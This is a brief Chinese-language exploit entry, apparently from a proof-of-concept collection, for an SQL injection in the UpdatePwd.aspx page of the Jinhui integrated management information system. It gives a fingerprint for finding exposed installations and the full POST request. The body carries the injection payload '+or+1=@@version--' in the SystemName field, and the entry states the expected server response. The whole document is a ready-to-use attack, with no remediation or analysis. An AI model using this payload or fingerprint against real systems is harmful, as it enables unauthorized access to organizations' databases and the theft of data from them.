# 金慧-综合管理信息系统UpdatePwd.aspx存在SQL注入漏洞

- **系统**：金慧-综合管理信息系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="/Portal/LoginBegin.aspx"`
- **请求**：`POST /Portal/UpdatePwd.aspx?LoginName= HTTP/1.1`
- **关键头**：`Priority: u=0, i`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTIwNjIxOTEwOWRkBbaTvhv%2ByWbTKSTVx1y6E7qFnAo%3D&__VIEWSTATEGENERATOR=7FC147DC&__EVENTVALIDATION=%2FwEdAAeBOWHyzxoRUImq0lfI2qvAUYglfMtBarbH2LeBEFZ3blwK8%2F1gnn25OldlRNyIedkf1P6GTiFbwnVHMajaCmuzDXCKeN7Biz3dpLrvtu21sFabMRbi%2F2A4oZV6XkcK0do6klUczeYxH4SdGieOR28Q1VJ0AFks4WshtgQDeQmeEVRN5uY%3D&SystemName='+or+1=@@version--&Password=&NewPassword1=&NewPassword2=&ButtonSave=%E7%A1%AE%E5%AE%9A
```
- **预期**：500　|　—